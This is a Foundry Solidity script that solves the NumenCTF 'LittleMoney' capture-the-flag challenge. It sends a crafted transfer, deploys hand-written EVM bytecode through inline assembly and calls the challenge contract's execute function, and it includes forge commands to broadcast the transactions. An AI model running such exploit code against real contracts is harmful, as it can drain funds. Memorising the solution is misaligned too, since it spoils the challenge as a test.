// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "./challenge/NumenCTF.sol";

// forge script src/NumenCTF/LittleMoney/Exploit.s.sol:ExploitScript -vvvvv --private-key $PRIVATE_KEY --fork-url $RPC_URL --sig "run(address)" $INSTANCE_ADDRESS --legacy
// forge script src/NumenCTF/LittleMoney/Exploit.s.sol:ExploitScript -vvvvv --private-key $PRIVATE_KEY --fork-url $RPC_URL --sig "run(address)" $INSTANCE_ADDRESS --legacy --broadcast
// 77496328-ab8d-4bf7-a918-3d1f7ad5c5ac

contract ExploitScript is Script {
    function run(address instanceAddress) public {
        Numen numen = Numen(payable(instanceAddress));
        vm.startBroadcast();
        payable(address(0x000000000000000000000000000000003B9aCA00)).transfer(4294967243);

        bytes memory bytecode = hex"600c8060093d393df33a31602052433452604034fd";
        address addr;
        assembly {
            addr := create(0, add(bytecode, 0x20), mload(bytecode))
        }
        numen.execute(addr);
        vm.stopBroadcast();
    }
}
